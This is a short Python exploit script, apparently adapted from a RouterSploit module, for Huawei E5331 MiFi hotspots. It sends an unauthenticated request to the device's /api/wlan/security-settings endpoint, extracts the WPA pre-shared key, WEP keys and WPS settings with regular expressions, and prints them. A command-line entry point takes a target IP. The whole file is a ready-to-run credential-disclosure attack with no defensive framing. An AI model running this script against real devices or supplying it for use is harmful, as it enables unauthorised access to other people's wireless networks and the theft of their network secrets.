target = ""
# title: Huawei E5331 Info Disclosure
# rsf exploit module
# description: Module exploits information disclosure vulnerability in Huawei E5331 MiFi Mobile Hotspot devices.

import re
import requests

class Exploit:
    def __init__(self):
        self.target = ""
        self.port = 80
        self.opts = ["WifiAuthmode", "WifiBasicencryptionmodes", "WifiWpaencryptionmodes", "WifiWepKey1", "WifiWepKey2",
                     "WifiWepKey3", "WifiWepKey4", "WifiWepKeyIndex", "WifiWpapsk", "WifiWpsenbl", "WifiWpscfg", "WifiRestart"]

    def http_request(self, method, path, **kwargs):
        url = f"http://{self.target}:{self.port}{path}"
        try:
            if method == "GET":
                return requests.get(url, **kwargs)
            elif method == "POST":
                return requests.post(url, **kwargs)
        except:
            return None

    def run(self):
        response = self.http_request(method="GET", path="/api/wlan/security-settings")
        if response is None:
            print("[-] Connection failed")
            return

        res = []
        for option in self.opts:
            regexp = f"<{option}>(.+?)</{option}>"
            value = re.findall(regexp, response.text)
            if value:
                res.append((option, value[0]))

        if len(res):
            print("[+] Found sensitive information!")
            print("-"*40)
            for item in res:
                print(f"{item[0]}: {item[1]}")
            print("-"*40)

    def check(self):
        response = self.http_request(method="GET", path="/api/wlan/security-settings")
        if response is None:
            return False

        res = []
        for option in self.opts:
            regexp = f"<{option}>(.+?)</{option}>"
            value = re.findall(regexp, response.text)
            if value:
                res.append(value)

        return bool(len(res))



import sys

if __name__ == "__main__":
    print("Run script:", __file__)
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    exploit = Exploit()
    exploit.target = target_ip
    exploit.run()
